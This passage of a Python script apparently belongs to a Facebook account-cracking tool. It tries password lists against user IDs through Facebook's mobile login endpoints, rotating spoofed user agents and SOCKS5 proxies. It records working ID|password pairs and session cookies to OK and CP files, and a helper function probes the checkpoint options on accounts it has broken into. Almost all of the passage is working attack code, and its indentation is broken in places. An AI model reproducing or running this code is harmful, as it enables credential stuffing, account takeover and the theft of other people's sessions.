error%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522e971aba2-6f14-44d0-98d3-44be37e9c6c8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522plim8mlau0dci6b51tc1%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			data = {
				"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
				"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
				"uid": idf,
				"next": "https://m.facebook.com/v13.0/dialog/oauth?cct_prefetching=0&client_id=3618539641590455&cbt=1696752891275&e2e=%7B%22init%22%3A1696752891275%7D&ies=1&sdk=android-13.1.0&sso=chrome_custom_tab&nonce=26963441-e2bf-496f-97bf-2c6623861aed&scope=openid%2Cpublic_profile%2Cemail&state=%7B%220_auth_logger_id%22%3A%22e971aba2-6f14-44d0-98d3-44be37e9c6c8%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%22plim8mlau0dci6b51tc1%22%7D&code_challenge_method=S256&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fbconnect%3A%2F%2Fcct.com.netease.partyglobal&auth_type=rerequest&response_type=id_token%2Ctoken%2Csigned_request%2Cgraph_domain&return_scopes=true&code_challenge=bZrS8Qf4YJl6Zmup0AMuKIP1g36luEnC6kIkQ3lDhqo&ret=login&fbapp_pres=0&logger_id=e971aba2-6f14-44d0-98d3-44be37e9c6c8&tp=unspecified",
				"flow": "login_no_pin",
				"encpass": f"#PWD_BROWSER:0:{str(TimeTegar()).split('.')[0]}:{pw}",
			}
			hider = {
				"Host": "mobile.facebook.com",
				"content-length": f"{len(str(data))}",
				"cache-control": "max-age=0",
				"viewport-width": "501",
				"sec-ch-ua": '"Not.A/Brand";v="24", "Chromium";v="116", "Google Chrome";v="116"',
				"sec-ch-ua-mobile": "?1",
				"sec-ch-ua-platform": '"Android"',
				"sec-ch-ua-platform-version": "11.0.0",
				"sec-ch-ua-full-version-list": '"Not.A/Brand";v="8.0.0.0", "Chromium";v="116.0.5845.58", "Google Chrome";v="116.0.5845.58"',
				"sec-ch-prefers-color-scheme": "light",
				"upgrade-insecure-requests": "1",
				"origin": "https://mobile.facebook.com",
				"content-type": "application/x-www-form-urlencoded",
				"user-agent": ua,
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "navigate",
				"sec-fetch-user": "?1",
				"sec-fetch-dest": "document",
				"referer": f"https://mobile.facebook.com/login.php?skip_api_login=1&api_key=3618539641590455&kid_directed_site=0&app_id=3618539641590455&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D3618539641590455%26cbt%3D1696752891275%26e2e%3D%257B%2522init%2522%253A1696752891275%257D%26ies%3D1%26sdk%3Dandroid-13.1.0%26sso%3Dchrome_custom_tab%26nonce%3D26963441-e2bf-496f-97bf-2c6623861aed%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522e971aba2-6f14-44d0-98d3-44be37e9c6c8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522plim8mlau0dci6b51tc1%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.netease.partyglobal%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DbZrS8Qf4YJl6Zmup0AMuKIP1g36luEnC6kIkQ3lDhqo%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De971aba2-6f14-44d0-98d3-44be37e9c6c8%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.netease.partyglobal%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522e971aba2-6f14-44d0-98d3-44be37e9c6c8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522plim8mlau0dci6b51tc1%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
				"accept-encoding": "gzip, deflate, br",
				"accept-language": bahasa
			}
			po = ses.post("https://mobile.facebook.com/login/device-based/validate-password/?shbl=0",data=data,headers=hider,allow_redirects=False)
			response=parser(po.text, "html.parser")
			if "checkpoint" in po.cookies.get_dict():
				cp+=1
				open('CP/'+cph,'a').write(f'{idf}|{pw}\n') 
				tree = Tree("                                 ")
				tree.add(f"\r{K}{idf} | {pw}{N}")
				tree.add(f"\r{P}Tahun : {B}{tahun(idf)}{N}")
				tree.add(f"\r{M}{ua}")
				prints(tree)
				break
			elif "c_user" in ses.cookies.get_dict():
				kuki = convert(ses.cookies.get_dict())
				ok+=1
				open('OK/'+okh,'a').write(f'{idf}|{pw}\n') 
				tree = Tree("                                 ")
				tree.add(f"\r{H}{idf} | {pw}{N}")
				tree.add(f"\r{P}Tahun : {B}{tahun(idf)}{N}")
				tree.add(f"\r{H}{kuki}")
				prints(tree)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
	
	###----------[ METODE ]----------###
	def validate2(idf,pwv):
	global loop,ok,cp
	ahir = str(datetime.datetime.now()-awal).split('.')[0]
	prog.update(des,description=f"\r[bold cyan]{ahir} [bold purple][[bold green]OK[bold white]:[bold green]{ok}{M}/[bold yellow]CP[bold white]:[bold yellow]{cp}[purple]] [bold white]{loop}[bold red]/[bold white]{len(id)} ")
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=141595129234543&kid_directed_site=0&app_id=141595129234543&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8184574-7e8f-41f3-b6d5-47a6c13f68fd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://developers.facebook.com/tools/debug/accesstoken/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"[bold yellow]{idf}|{pw}")
					tree.add(f"[bold yellow]{ua}")
					cetak(tree) 
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"[bold yellow]{idf}|{pw}")
					tree.add(f"[bold yellow]{ua}")
					cetak(tree) 
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree(f"  ")
					tree.add(f"[bold green]{idf}|{pw}")
					tree.add(f"[bold green]{kuki}\n")
					cetak(tree) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree(f"  ")
					tree.add(f"[bold green]{idf}|{pw}")
					tree.add(f"[bold green]{kuki}\n")
					cetak(tree) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def ceker(idf,pw):
	sess=requests.Session()
	data={}
	data2={}
	uua="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
	sess.headers.update({"User-Agent":uua,"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://m.facebook.com/","user-agent":"ua"})
	soup=parse(sess.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):data.update({x.get("name"):x.get("value")})
	data.update({"email":idf,"pass":pw})
	response=parse(sess.post("https://m.facebook.com"+link.get("action"),data=data).text,"html.parser")
	try:
		link2=response.find("form",{"method":"post"});listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:data2.update({x.get("name"):x.get("value")}) 
		responses=parse(sess.post("https://m.facebook.com"+link2.get("action"),data=data2).text,"html.parser")
		cek=[cek.text for cek in responses.find_all("option")]
		if len(cek)==0:pass
		else:
			for opsi in range(len(cek)):ops.append(print(f" {xxx}{cek[opsi]}"))
	except:pass
	if len(ops)==0:pass
	print (' [+] Columns(ops)')
		
				
###---[ CONVERT COOKIE ]---###
def convert(cookie):
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))

###----------#[ CREAT FILE ]#----------###
#def memulai():
	try:os.mkdir('/sdcard/AKUN-OK')
	except:pass
	try:os.mkdir('/sdcard/DUMP-FILE')
	except:pass
	try:os.mkdir('A2F')
	except:pass
	#login_baz()
if __name__=='__main__':
	#try:os.system('git pull')
	login()
